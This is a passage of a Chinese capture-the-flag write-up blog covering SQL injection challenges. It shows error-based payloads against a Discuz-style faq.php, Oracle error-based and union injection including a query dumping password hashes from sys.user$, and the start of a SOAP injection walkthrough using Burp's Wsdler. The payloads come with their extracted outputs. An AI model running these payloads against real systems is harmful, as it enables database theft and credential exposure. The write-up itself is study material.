class="string">&#x27;grouppermission&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">	<span class="title function_ invoke__">ksort</span>(<span class="variable">$gids</span>);</span><br><span class="line">	<span class="variable">$groupids</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$gids</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">		<span class="variable">$groupids</span>[] = <span class="variable">$row</span>[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$query</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT * FROM <span class="subst">&#123;$tablepre&#125;</span>usergroups u LEFT JOIN <span class="subst">&#123;$tablepre&#125;</span>admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (&quot;</span>.<span class="title function_ invoke__">implodeids</span>(<span class="variable">$groupids</span>).<span class="string">&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">implodeids</span>(<span class="params"><span class="variable">$array</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&#x27;&quot;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;&#x27;,&#x27;&quot;</span>, <span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>) ? <span class="variable">$array</span> : <span class="keyword">array</span>(<span class="variable">$array</span>)).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[2]=&#39;</code>直接拼入<code>&amp;gids[2]=&#39;&amp;gids[3]=3&amp;gids[4]=4</code>，即<code>http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[2]=&#39;&amp;gids[3]=3&amp;gids[4]=4</code>。得到sql语句<code>SELECT * FROM [Table]usergroups u LEFT JOIN [Table]admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (&#39;7&#39;,&#39;\&#39;,&#39;3&#39;,&#39;4&#39;)</code>。得到 报错<code>……for the right syntax to use near &#39;3&#39;,&#39;4&#39;)&#39; at line 1</code>，即在<code>\&#39;</code>的转义下，单引号不闭合，造成<code>4</code>后的单引号逃逸直接报错。</p></li><li><p>对大佬得构造语句进行理解：两重select嵌套，保证内层<code>select</code>中<code>floor</code>报错执行，若实现得到有用信息，需要使用<code>concat</code>方法将注入语句与<code>floor(rand(0)*2)</code>进行组合，使报错时出现有用信息（仅个人理解，不保证正确）。</p></li><li><p><code>http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[2]=&#39;&amp;gids[3][0]=) and (select 1 from (select floor(rand(0)*2) as x,count(*) from mysql.user group by x)y)%23</code><br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.37oy0zqaeeu0.jpg" alt="tumeiimage"></p></li><li><p>最后构成的exp：<code>http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[2]=&#39;&amp;gids[3][0]=) and (select 1 from (select concat(0x7e,database(),0x7e,floor(rand(0)*2)) as x,count(*) from mysql.user group by x)y)%23</code></p></li></ul><h2 id="0o02-注入流程-1"><a href="#0o02-注入流程-1" class="headerlink" title="0o02 注入流程"></a>0o02 注入流程</h2><ul><li>另一种exp利用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拿库名</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,database(),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Error: Duplicate entry &#x27;root@localhost~122~1&#x27; for key &#x27;group_key&#x27;--&gt;当前库有122个不重复的表！！！</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select count(distinct(table_name)) from information_schema.columns where table_schema=database()),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在当前表用 bp爆破 找不到flag相关表，放大范围（所有表）--&gt;flag_nice</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select distinct(table_name) from information_schema.columns limit 173,1),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所以……是在哪个库里的……--&gt;ucenter</span></span><br><span class="line"><span class="comment">// 注：where子查询需要需要16进制编码：flag_nice--&gt;0x666c61675f6e696365</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select distinct(table_schema) from information_schema.columns where table_name=0x666c61675f6e696365),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字段--&gt;flag_is_here</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select distinct(column_name) from information_schema.columns where table_name=0x666c61675f6e696365),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如上语句出现其他错误：Subquery returns more than 1 row</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,(select flag_is_here from ucenter.flag_nice limit 1),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多条记录？？？限定返回一条记录了的！改为查询记录数，确是仅有一条记录</span></span><br><span class="line"><span class="comment">// 查阅其他wp，说是flag过长所致！！！添加 substring 方法进行截断</span></span><br><span class="line"><span class="comment">// 似是而非？暂时当作是！！！</span></span><br><span class="line"><span class="comment">// flag--&gt;flag&#123;5e5c2dea317a62d0c43db8143e09d91a&#125;</span></span><br><span class="line">http:<span class="comment">//47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select concat(user(),0x7e,substring((select flag_is_here from ucenter.flag_nice limit 1),1,40),0x7e))),floor(rand(0)*2))x from information_schema.tables group by x)a))%23</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select%201%20from(select%20count(*),concat((select%20(select%20concat(user(),0x7e,(select%20distinct(table_name)%20from%20information_schema.columns%20limit%20173,1),0x7e))),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a))%23</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.103.94.191:8042</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>pR1_sid=2QZKZM; ECS_ID=c139056c976fc6deeb76c792a0d2ccfff0b93823; ECS[visit_times]=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.51l1htvmj200.jpg" alt="tumeiimage"></p><h1 id="0x0a-Oracle注入"><a href="#0x0a-Oracle注入" class="headerlink" title="0x0a Oracle注入"></a>0x0a Oracle注入</h1><h2 id="0o00-题目提示-9"><a href="#0o00-题目提示-9" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oracle注入</span><br><span class="line"></span><br><span class="line">题目url：http:<span class="comment">//106.15.50.112:8015/search.php</span></span><br></pre></td></tr></table></figure><h2 id="0o01-Oracle-部分知识"><a href="#0o01-Oracle-部分知识" class="headerlink" title="0o01 Oracle 部分知识"></a>0o01 Oracle 部分知识</h2><h3 id="0b00-基础知识"><a href="#0b00-基础知识" class="headerlink" title="0b00 基础知识"></a>0b00 基础知识</h3><ol><li>Oracle数据库的注释符，单行注释：<code>--</code>，多行注释：<code>/**/</code>。</li><li><code>dual</code>：Oracle 数据库的虚表，供任意用户读取，在没有目标表的<code>select</code>语句中经常用到</li><li>Oracle 数据库使用<code>||</code>拼接字符串。</li><li>Oracle 数据库对 MySQL 数据库中<code>limit</code>关键字的表述转为使用虚表的<code>rownum</code>字段判断：<code>select * from users where rownum=1;</code>。</li><li>Oracle数据库中使用双引号<code>&quot;</code>来消除系统关键字，即某一字段能与系统关键字同名时，将该关键字用双引号引起：<code>select &quot;where&quot; from tests</code>。</li><li>用户：Oracle 数据库的基本单位，类似 MySQL 数据库的库。</li><li>表：Oracle 的每一个用户下有表，类似 MySQL 数据库的库下的表。</li><li>表空间：Oracle 数据库的逻辑划分，是Oracle数据库恢复的最小单位。一个 Oracle 数据库至少有一个表空间（system表空间）。</li></ol><h3 id="0b01-默认表空间"><a href="#0b01-默认表空间" class="headerlink" title="0b01 默认表空间"></a>0b01 默认表空间</h3><ul><li>Oracle 数据库创建时，默认生成5个表空间，如下：</li></ul><ol><li><code>SYSTEM</code>：存储系统表和管理配置等基本信息。</li><li><code>SYSAUX</code>：类似于SYSTEM，存放系统附加信息，减轻 SYSTEM 的空间负担。</li><li><code>UNDO</code>：用于事务回退等。</li><li><code>TEMP</code>：存储临时数据。</li><li><code>USERS</code>：默认存储用户信息的表空间。</li></ol><h3 id="0b10-权限与用户"><a href="#0b10-权限与用户" class="headerlink" title="0b10 权限与用户"></a>0b10 权限与用户</h3><ul><li>权限区分：</li></ul><ol><li><code>DBA</code>：系统最高权限，可创建数据库结构。</li><li><code>resource</code>：仅可创建实体，不可以创建数据库结构。</li><li><code>connect</code>：仅可登录 Oracle，不可以创建实体，不可以创建数据库结构。</li></ol><ul><li>默认用户区分</li></ul><ol><li><code>sys</code>：类似 Linux 的 root 用户，属于 DBA 角色。</li><li><code>system</code>：类似 sys 用户，但缺少修改关键系统数据的权限，属于 DBA 角色。</li><li><code>public</code>：类似一个数据库用户的集合，对其操作会应用到所有用户上。</li></ol><h3 id="0b11-部分系统表"><a href="#0b11-部分系统表" class="headerlink" title="0b11 部分系统表"></a>0b11 部分系统表</h3><ol><li><code>dba_users</code>：数据库用户信息。</li><li><code>dba_segments</code>：表段信息。</li><li><code>dba_tablespaces</code>：数据库表空间信息。</li><li><code>user_segments</code>：当前用户的表段信息。</li><li><code>user_tables</code>：当前用户的表对象信息，常用字段：<code>table_name</code>。</li><li><code>user_tab_columns</code>：当前用户的表列信息，常用字段：<code>column_name</code>。</li><li><code>all_users</code>：数据库所有用户的信息。</li><li><code>all_objects</code>：数据库所有对象的信息。</li><li><code>all_tables</code>：数据库所有表对象的信息。</li><li><code>session_roles</code>：会话角色信息。</li><li><code>session_privs</code>：会话角色权限。</li><li><code>v$database</code>：数据库信息。</li><li><code>v$datafile</code>：数据文件信息。</li><li><code>v$logfile</code>：日志文件信息。</li><li><code>v$loghist</code>：日志历史信息。</li></ol><h2 id="0o02-注入流程-2"><a href="#0o02-注入流程-2" class="headerlink" title="0o02 注入流程"></a>0o02 注入流程</h2><ul><li>笔者不了解 Oracle 数据库，此处不做过多说明。</li><li>度娘找几篇 Oracle 手注文章。</li><li>题目为搜索型注入，直接写入<code>1&#39;</code>报错：<code>ORA-01756: quoted string not properly terminated</code>，即引用字符串未正确终止（单引号）。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试存在 --&gt; ORA-01756: quoted string not properly terminated</span></span><br><span class="line">name=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 构造闭合</span></span><br><span class="line"><span class="string">name=1&#x27;</span> or <span class="number">1</span>=<span class="number">1</span> -- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// 爆 Oracle 版本 --&gt; Oracle Database 10g Express Edition Release 10.2.0.1.0</span></span><br><span class="line">name=<span class="number">1</span><span class="string">&#x27; and 1=ctxsys.drithsx.sn(1, (select banner from v$version where rownum=1)) -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 爆 IP 地址 --&gt; 172.22.0.2</span></span><br><span class="line"><span class="string">name=1&#x27;</span> and <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>, (<span class="keyword">select</span> utl_inaddr.get_host_address from dual)) -- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// 爆日志文件位置 --&gt; /usr/lib/oracle/xe/app/oracle/flash_recovery_area/XE/onlinelog/o1_mf_2_k7df9co7_.log</span></span><br><span class="line">name=<span class="number">1</span><span class="string">&#x27; and 1=ctxsys.drithsx.sn(1, (select member from v$logfile where rownum=1)) -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 判DBA权限 --&gt; FALSE</span></span><br><span class="line"><span class="string">name=1&#x27;</span> and <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>, (<span class="keyword">select</span> SYS_CONTEXT (<span class="string">&#x27;USERENV&#x27;</span>, <span class="string">&#x27;ISDBA&#x27;</span>) from dual)) -- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// 爆全部表空间，修改数字“6”处即可 --&gt; PENTEST</span></span><br><span class="line"><span class="comment">// 说明：ROWNUM 为伪列，是伴随结果集生成的字段</span></span><br><span class="line"><span class="comment">// 内层语句中，拿到了内层结果集的两个字段，其中 ROWNUM 字段重命名为 CON。</span></span><br><span class="line"><span class="comment">// 外层语句中，利用内层结果集作虚表再次查询，通过 CON 字段指定返回的某条记录。</span></span><br><span class="line"><span class="comment">// 判断，两层嵌套的目的是为了达到类似 limit 关键字的效果，即拿到指定记录。</span></span><br><span class="line">name=<span class="number">1</span><span class="string">&#x27; and 1=ctxsys.drithsx.sn(1, (SELECT TABLESPACE_NAME FROM(SELECT DBA_TABLESPACES.TABLESPACE_NAME, ROWNUM AS CON FROM DBA_TABLESPACES WHERE ROWNUM&gt;0)WHERE CON=6)) -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 爆当前表空间的表 --&gt; USERS，FLAG_HERE</span></span><br><span class="line"><span class="string">name=1&#x27;</span> and <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>, (SELECT table_name FROM(SELECT user_tables.table_name, ROWNUM AS CON FROM user_tables WHERE ROWNUM&gt;<span class="number">0</span>)WHERE CON=<span class="number">2</span>)) -- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// 爆当前表空间下 FLAG_HERE 表字段 --&gt; ID，FLAG_NAME</span></span><br><span class="line">name=<span class="number">1</span><span class="string">&#x27; and 1=ctxsys.drithsx.sn(1, (SELECT column_name FROM(SELECT user_tab_columns.column_name, ROWNUM AS CON FROM user_tab_columns WHERE ROWNUM &gt;0 and table_name=&#x27;</span>FLAG_HERE<span class="string">&#x27;)WHERE CON=2)) -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 爆内容???看着不像 --&gt; this_is_flag</span></span><br><span class="line"><span class="string">name=1&#x27;</span> and <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>, (SELECT FLAG_NAME FROM(SELECT FLAG_HERE.FLAG_NAME, ROWNUM AS CON FROM FLAG_HERE WHERE ROWNUM&gt;<span class="number">0</span>)WHERE CON =<span class="number">1</span>)) -- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个表有两条记录！！！ --&gt; flag&#123;65736915fea1aa72a0b2446540a81524&#125;</span></span><br><span class="line">name=<span class="number">1</span><span class="string">&#x27; and 1=ctxsys.drithsx.sn(1, (SELECT FLAG_NAME FROM(SELECT FLAG_HERE.FLAG_NAME, ROWNUM AS CON FROM FLAG_HERE WHERE ROWNUM&gt;0)WHERE CON =2)) -- -</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.46mbwduu41s0.jpg" alt="tumeiimage"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 联合查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// order byp 判断字段个数</span></span><br><span class="line">name=<span class="number">1</span><span class="string">&#x27; order by 4 -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 查字段数，判断输出点</span></span><br><span class="line"><span class="string">name=-1&#x27;</span>  union <span class="keyword">select</span> null,null,null from dual -- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字段类型猜想</span></span><br><span class="line">name=<span class="number">-1</span><span class="string">&#x27;  union select 3,&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27; from dual -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 查看当前数据库连接用户 --&gt; PENTEST</span></span><br><span class="line"><span class="string">name=1&#x27;</span> union <span class="keyword">select</span> <span class="number">3</span>,(SELECT user FROM dual),<span class="string">&#x27;2&#x27;</span> from dual-- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// 爆SID --&gt; XE</span></span><br><span class="line">name=<span class="number">-1</span><span class="string">&#x27;  union select 3,(select instance_name from V$INSTANCE),&#x27;</span><span class="number">1</span><span class="string">&#x27; from dual -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 爆账密</span></span><br><span class="line"><span class="string">name=1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,name,spare4 from(<span class="keyword">select</span> rownum as con,name,spare4 from sys.user$ where rownum&gt;<span class="number">0</span>) where con=<span class="number">30</span>-- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿flag</span></span><br><span class="line">name=<span class="number">-1</span><span class="string">&#x27;  union select 3,(SELECT FLAG_NAME FROM(SELECT FLAG_HERE.FLAG_NAME, ROWNUM AS CON FROM FLAG_HERE WHERE ROWNUM&gt;0)WHERE CON =2),&#x27;</span><span class="number">1</span><span class="string">&#x27; from dual -- -</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.1zn6kf3y6n9c.jpg" alt="tumeiimage"></p><h2 id="0o03-参考文档"><a href="#0o03-参考文档" class="headerlink" title="0o03 参考文档"></a>0o03 参考文档</h2><ul><li><a class="link" target="_blank" rel="noopener" href="https://www.jianshu.com/p/5ce219032823">https://www.jianshu.com/p/5ce219032823<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42508548/article/details/121516717">https://blog.csdn.net/weixin_42508548/article/details/121516717<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwODAzNzcxMQ==&amp;mid=2247483713&amp;idx=1&amp;sn=2ec5d7db9cc1612ded726aa16c96aff7&amp;chksm=97087361a07ffa77a0fb73d53c626424030297e8362ffad386bbb5b12a3772359fd13eafce86&amp;mpshare=1&amp;scene=23&amp;srcid=0605AN2Ie50vNytZpMqAkDcD&amp;sharer_sharetime=1654435175432&amp;sharer_shareid=2957c05f62be643745e32bae234d95a3#rd">https://mp.weixin.qq.com/s?__biz=MzIwODAzNzcxMQ==&amp;mid=2247483713&amp;idx=1&amp;sn=2ec5d7db9cc1612ded726aa16c96aff7&amp;chksm=97087361a07ffa77a0fb73d53c626424030297e8362ffad386bbb5b12a3772359fd13eafce86&amp;mpshare=1&amp;scene=23&amp;srcid=0605AN2Ie50vNytZpMqAkDcD&amp;sharer_sharetime=1654435175432&amp;sharer_shareid=2957c05f62be643745e32bae234d95a3#rd<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247489858&amp;idx=1&amp;sn=404e485caa4e7a537b66fa2dcdcf69dc&amp;chksm=e89e319adfe9b88c414d20db1246404b3596b7f676cd7a042a64192442155e201f0826eae702&amp;mpshare=1&amp;scene=23&amp;srcid=0606jTmPMqnguiS9U9jPMtrf&amp;sharer_sharetime=1654481070263&amp;sharer_shareid=2957c05f62be643745e32bae234d95a3#rd">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247489858&amp;idx=1&amp;sn=404e485caa4e7a537b66fa2dcdcf69dc&amp;chksm=e89e319adfe9b88c414d20db1246404b3596b7f676cd7a042a64192442155e201f0826eae702&amp;mpshare=1&amp;scene=23&amp;srcid=0606jTmPMqnguiS9U9jPMtrf&amp;sharer_sharetime=1654481070263&amp;sharer_shareid=2957c05f62be643745e32bae234d95a3#rd<i class="fas fa-external-link-alt"></i></a></li></ul><h1 id="0x0b-SOAP协议注入"><a href="#0x0b-SOAP协议注入" class="headerlink" title="0x0b SOAP协议注入"></a>0x0b SOAP协议注入</h1><h2 id="0b00-题目提示"><a href="#0b00-题目提示" class="headerlink" title="0b00 题目提示"></a>0b00 题目提示</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SOAP协议注入</span><br><span class="line"></span><br><span class="line">题目URL：http:<span class="comment">//47.103.94.191:8018/</span></span><br><span class="line"></span><br><span class="line">提示：flag在数据库里面</span><br></pre></td></tr></table></figure><h2 id="0b01-SOAP协议"><a href="#0b01-SOAP协议" class="headerlink" title="0b01 SOAP协议"></a>0b01 SOAP协议</h2><ol><li>即简单对象访问协议，是数据交换的一种协议规范，是一种轻量的、简单的、基于XML的协议，被设计成在WEB上交换结构化的和固化的信息。</li><li><code>SOAP=RPC+HTTP+XML</code>，即采用HTTP通信协议，RPC作为一致性的调用途径，XLM作为数据传送的格式。</li><li>消息格式<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:soap</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Envelope 元素：可将 xml 文档标识为 soap 消息。</span></span><br><span class="line"><span class="comment">Header 元素：包含头部信息。</span></span><br><span class="line"><span class="comment">Body 元素：包含所有的调用和响应信息，当Body内有存在数据可控时，有可能存在注入。</span></span><br><span class="line"><span class="comment">Fault 元素：提供有关在处理此消息时所发生错误的信息。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></li><li>SOAP请求易受SQL注入攻击，提交参数作为变种 SQL　查询可以泄露敏感信息。</li></ol><h2 id="0o02-注入过程"><a href="#0o02-注入过程" class="headerlink" title="0o02 注入过程"></a>0o02 注入过程</h2><ol><li><p>burp suite下载插件：<code>Wsdler</code>。</p></li><li><p>burp 抓取<code>http://47.103.94.191:8018/ws_soap.php?wsdl</code>页面请求包，并发送到<code>Wsdler</code>模块（右键 –&gt; <code>Extensions</code> –&gt; <code>Wsdler</code> –&gt; <code>Parse WSDL</code>），将<code>Parse WSDL</code>解析出来的SOAP请求包复制下来，可以直接丢到sqlmap梭一把，抑或手注。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span 